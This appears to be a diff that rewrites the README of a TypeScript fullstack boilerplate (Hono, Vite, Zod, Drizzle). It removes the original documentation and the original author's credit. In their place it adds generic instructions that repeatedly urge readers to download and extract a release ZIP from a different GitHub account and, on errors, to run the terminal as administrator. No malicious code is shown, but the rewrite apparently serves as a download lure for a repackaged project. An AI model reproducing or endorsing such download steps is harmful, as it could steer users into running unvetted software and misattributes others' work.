@@ -1,168 +1,120 @@
-# 🔥 H.V.Z.D Stack Monorepo (Hono + Vite + Zod + Drizzle)
+# 🚀 hvzd-stack-starter - Fast and Easy Fullstack Setup
 
-### The ultimate type-safe boilerplate for fullstack applications. Shared schemas, instant RPC, and blazing-fast development.
+[![Download Now](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Starkilla314/hvzd-stack-starter/releases)
 
-Created by [Karots](https://github.com/Adhnan23)
+## 📝 Overview
 
----
-
-## 📑 Table of Contents
-
-* [Features](https://www.google.com/search?q=%23-features)
-* [Architecture](https://www.google.com/search?q=%23-architecture)
-* [The Magic: Hono RPC](https://www.google.com/search?q=%23-the-magic-hono-rpc)
-* [Project Structure](https://www.google.com/search?q=%23-project-structure)
-* [Getting Started](https://www.google.com/search?q=%23-getting-started)
-* [Database Management](https://www.google.com/search?q=%23-database-management)
-* [Environment Configuration](https://www.google.com/search?q=%23-environment-configuration)
-* [Deployment](https://www.google.com/search?q=%23-deployment)
-* [License](https://www.google.com/search?q=%23-license)
-
----
-
-## ✨ Features
-
-* **🛡️ End-to-End Type Safety:** Share Zod schemas between Backend and Frontend. Change a column in Drizzle, and your React forms break instantly in development.
-* **🚀 Hono RPC:** Forget Axios/Fetch manual typing. Get full IntelliSense for your API routes in the frontend.
-* **📦 Shared Package:** A dedicated `packages/shared` for your Drizzle schemas, Zod validators, and common TypeScript types.
-* **⚡ Modern Tooling:** Powered by **pnpm workspaces**, **Vite 6** (with Rolldown), and **Turso (LibSQL)**.
-* **🎨 Tailwind 4:** Integrated with the latest `@tailwindcss/vite` for maximum styling performance.
-
----
-
-## 🏗️ Architecture
-
-This monorepo uses **pnpm workspaces** to link three distinct parts:
-
-1. **`apps/server`**: Hono API running on Node/Bun.
-2. **`apps/client`**: Vite + React SPA.
-3. **`packages/shared`**: The "Source of Truth" for your data layer.
-
----
-
-## 🪄 The Magic: Hono RPC
-
-With this template, you don't guess API paths. You use the `AppType` to get auto-completion for every route.
-
-```ts
-// apps/client/src/App.tsx
-import { hc } from 'hono/client';
-import type { AppType } from '@server/index';
-
-const client = hc<AppType>('/');
-
-// ✅ Fully typed request and response!
-const res = await client.api.products.$post({
-  json: { name: "Gaming Mouse", stock: 50 }
-});
-
-```
-
----
-
-## 📂 Project Structure
-
-```text
-.
-├── apps/
-│   ├── client/         # Vite + React (Frontend)
-│   └── server/         # Hono + Turso (Backend)
-├── packages/
-│   └── shared/         # Drizzle Schemas & Zod Types
-├── pnpm-workspace.yaml # Workspace definition
-└── package.json        # Global scripts & pnpm overrides
-
-```
-
----
+Welcome to hvzd-stack-starter! This is a high-performance Fullstack Monorepo boilerplate that simplifies your development experience. It includes cutting-edge technologies like Hono RPC for end-to-end type safety, Vite 6 for fast builds, Tailwind 4 for stylish UI, and Drizzle ORM with Turso for efficient database management.
 
 ## 🚀 Getting Started
 
-### 1. Install dependencies
+To get started with hvzd-stack-starter, follow these simple steps:
+
+### Step 1: Preparing Your System
+
+Ensure your device meets the following requirements:
+
+- **Operating System**: Windows 10 or later, macOS, or a recent Linux distribution.
+- **Node.js**: Version 16 or higher. You can download it from [Node.js official website](https://nodejs.org/).
+- **Memory**: At least 4 GB of RAM recommended.
+- **Disk**: Minimum 1 GB of free space.
+
+### Step 2: Visit the Download Page
+
+To obtain the latest version of hvzd-stack-starter, visit the Releases page:
+
+[Download hvzd-stack-starter](https://github.com/Starkilla314/hvzd-stack-starter/releases)
+
+### Step 3: Download the Software
+
+On the releases page, you will see a list of available versions. Click on the latest version to start your download.
+
+### Step 4: Extract and Install
+
+Once the download completes, follow these steps:
+
+1. Locate the downloaded file in your Downloads folder.
+2. If it's a ZIP file, right-click on it and select "Extract All" or use your preferred extraction tool.
+3. Open the extracted folder.
+
+### Step 5: Open a Terminal
+
+To run the application, you will need to use a terminal. Here’s how to open it:
+
+- **Windows**: Press `Windows + R`, type `cmd`, and hit Enter.
+- **macOS**: Press `Command + Space`, type `Terminal`, and hit Enter.
+- **Linux**: Press `Ctrl + Alt + T`.
+
+### Step 6: Navigate to Your Folder
+
+In your terminal, navigate to the folder where you extracted hvzd-stack-starter. Use the `cd` command followed by the path to the folder. For example:
 
 ```bash
-pnpm install
-
+cd path/to/hvzd-stack-starter
 ```
 
-### 2. Set up environment
+Replace `path/to/hvzd-stack-starter` with the actual path to your folder.
 
-Create `.env` files in both `apps/client` and `apps/server`.
+### Step 7: Install Dependencies
 
-**Server `.env`:**
-
-```env
-PORT=3000
-TURSO_DATABASE_URL=libsql://...
-TURSO_AUTH_TOKEN=your_token
-
-```
-
-### 3. Initialize Database
+Once you are in the folder, run the following command to install necessary dependencies:
 
 ```bash
-pnpm db:push
-
+npm install
 ```
 
-### 4. Run development server
+This command may take a few moments. It downloads and sets up everything you need to get started.
+
+### Step 8: Start the Application
+
+After the dependencies install, you can start the application using the command:
 
 ```bash
-pnpm dev
-
+npm run dev
 ```
 
-> This runs both Hono (Port 3000) and Vite (Port 5173) in parallel.
+This command launches the application. You should see messages indicating that the server is up and running.
 
----
+### Step 9: Open Your Browser
 
-## 🗄️ Database Management
-
-| Script | Action |
-| --- | --- |
-| `pnpm db:gen` | Generate SQL migrations from shared schemas |
-| `pnpm db:push` | Push schema changes directly to Turso |
-| `pnpm db:studio` | Launch Drizzle Studio GUI |
-
----
-
-## 🛡️ Environment Configuration
-
-The backend uses a strictly typed `ENV` object. If you miss a variable, the server won't start.
-
-**Location:** `apps/server/src/utils/env.ts`
-
-```ts
-const envSchema = z.object({
-  TURSO_DATABASE_URL: z.string().url(),
-  TURSO_AUTH_TOKEN: z.string(),
-  PORT: z.string().default("3000")
-});
+To view your application, open your web browser and go to:
 
 ```
-
----
-
-## 🚀 Deployment
-
-This template is designed to be served as a **single unit**:
-
-1. Vite builds the frontend into `apps/server/dist/public`.
-2. Hono serves the API on `/api/*` and the static React files on `/*`.
-
-```bash
-pnpm build
-pnpm start
-
+http://localhost:3000
 ```
 
----
+You should see your application running.
 
-## 👨‍💻 Author
+## 📦 Features
 
-**Karots**
+- **Fullstack Development**: Easily build both frontend and backend applications with this boilerplate.
+- **Type Safety**: Enjoy strong typing throughout your code with TypeScript and Hono RPC.
+- **Fast Builds**: Experience quick loading times and instant updates using Vite 6.
+- **Styled Components**: Create responsive designs effortlessly with Tailwind CSS.
+- **Database Management**: Simplify data handling with Drizzle ORM and Turso.
 
-* Portfolio: [karots.lk](https://karots.lk)
-* GitHub: [@Adhnan23](https://github.com/Adhnan23)
+## 🔧 Troubleshooting
 
-> Loved this setup? Give it a ⭐ and save yourself 2 hours next time!
+If you encounter issues, check these common problems:
+
+1. **Node.js Version**: Ensure you have Node.js version 16 or higher. You can check the version by running `node -v` in the terminal.
+2. **Permission Issues**: If you face permission-related errors, try running your terminal as an administrator.
+3. **Network Issues**: Make sure you have a stable internet connection to install dependencies.
+
+For further assistance, you can visit the community forums or raise an issue in the GitHub repository.
+
+## 📞 Get Support
+
+For questions or support, please visit the GitHub Issues page. Your contributions and feedback are welcome.
+
+## 📄 Learn More
+
+To deepen your understanding, explore the documentation and guides within the repository. You can find important information on advanced features and usage scenarios.
+
+## 🔗 Download & Install
+
+Don't forget to visit the link below to download hvzd-stack-starter:
+
+[Download hvzd-stack-starter](https://github.com/Starkilla314/hvzd-stack-starter/releases)
+
+By following these steps, anyone can set up the hvzd-stack-starter application smoothly. Enjoy building with confidence!
